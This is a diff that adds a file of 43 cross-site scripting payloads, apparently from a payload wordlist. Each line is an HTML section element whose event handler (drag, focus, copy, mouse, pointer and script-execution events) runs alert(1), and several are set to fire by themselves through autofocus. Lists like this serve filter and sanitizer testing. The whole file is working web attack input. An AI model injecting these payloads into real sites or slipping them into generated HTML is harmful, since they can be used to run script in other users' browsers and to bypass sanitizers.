@@ -1,0 +1,43 @@
+<section draggable="true" ondrag="alert(1)">test</section>
+<section draggable="true" ondragend="alert(1)">test</section>
+<section draggable="true" ondragenter="alert(1)">test</section>
+<section draggable="true" ondragleave="alert(1)">test</section>
+<section draggable="true" ondragstart="alert(1)">test</section>
+<section id=x tabindex=1 onactivate=alert(1)></section>
+<section id=x tabindex=1 onbeforeactivate=alert(1)></section>
+<section id=x tabindex=1 onbeforedeactivate=alert(1)></section><input autofocus>
+<section id=x tabindex=1 ondeactivate=alert(1)></section><input id=y autofocus>
+<section id=x tabindex=1 onfocus=alert(1)></section>
+<section id=x tabindex=1 onfocusin=alert(1)></section>
+<section onafterscriptexecute=alert(1)><script>1</script>
+<section onbeforecopy="alert(1)" contenteditable>test</section>
+<section onbeforecut="alert(1)" contenteditable>test</section>
+<section onbeforepaste="alert(1)" contenteditable>test</section>
+<section onbeforescriptexecute=alert(1)><script>1</script>
+<section onblur=alert(1) tabindex=1 id=x></section><input autofocus>
+<section onclick="alert(1)">test</section>
+<section oncontextmenu="alert(1)">test</section>
+<section oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<section oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<section ondblclick="alert(1)" autofocus tabindex=1>test</section>
+<section onfocusout=alert(1) tabindex=1 id=x></section><input autofocus>
+<section onkeydown="alert(1)" contenteditable>test</section>
+<section onkeypress="alert(1)" contenteditable>test</section>
+<section onkeyup="alert(1)" contenteditable>test</section>
+<section onmousedown="alert(1)">test</section>
+<section onmouseenter="alert(1)">test</section>
+<section onmouseleave="alert(1)">test</section>
+<section onmousemove="alert(1)">test</section>
+<section onmouseout="alert(1)">test</section>
+<section onmouseover="alert(1)">test</section>
+<section onmouseup="alert(1)">test</section>
+<section onmousewheel=alert(1)>requires scrolling
+<section onpaste="alert(1)" contenteditable>test</section>
+<section onpointerdown=alert(1)>XSS</section>
+<section onpointerenter=alert(1)>XSS</section>
+<section onpointerleave=alert(1)>XSS</section>
+<section onpointermove=alert(1)>XSS</section>
+<section onpointerout=alert(1)>XSS</section>
+<section onpointerover=alert(1)>XSS</section>
+<section onpointerrawupdate=alert(1)>XSS</section>
+<section onpointerup=alert(1)>XSS</section>
